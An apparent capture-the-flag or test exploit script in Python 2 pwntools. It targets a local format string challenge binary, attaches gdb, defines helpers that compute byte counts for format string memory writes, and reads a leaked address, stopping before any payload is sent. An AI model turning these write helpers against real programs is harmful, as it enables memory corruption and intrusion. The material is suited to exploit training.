from pwn import *

import time

target = process("./chall-test_fmtString-12-x86")
gdb.attach(target, gdbscript="verify_exploit")

def getOverflowInt(bytesSize):
	x = 0x0
	for i in range(0, bytesSize):
		x = (x << 8)
		x = x | 0xff
	x += 1
	return x

def get0fInt(bytesSize):
	x = 0x0
	for i in range(0, bytesSize):
		x = (x << 8)
		x = x | 0xff
	return x

def getIntSizeBytes(x):
	if x == 0:
		return 0

	byteSize = 0
	while x != 0:
		x = (x >> 8)
		byteSize += 1
	return byteSize

def getWriteSize(writeValue, writtenValue):
	if writeValue > writtenValue:
		valuePrinted = writeValue - writtenValue
		return valuePrinted

	else:
		writeSize = getIntSizeBytes(writeValue)
		overflowInt = getOverflowInt(writeSize)
		andInt = get0fInt(writeSize)

		alreadyWritten = (writtenValue & andInt)
		reachOverflow = overflowInt - alreadyWritten

		valuePrinted = reachOverflow + writeValue 
		return valuePrinted

def getBytesAt(value, offset, size):
	value = value >> (offset * 8)
	i = 0
	retValue = 0
	while size != 0:
		currentByte = (value & 0xff)
		value = value >> 8
		size -= 1
		currentByte = currentByte << (8*i)
		retValue = retValue | currentByte
		i += 1
	return retValue

target.recvuntil("Tell me I was never good enough: ")
leak = int(target.recvline().strip("\n"), 16)
print "target address is: " + hex(leak)

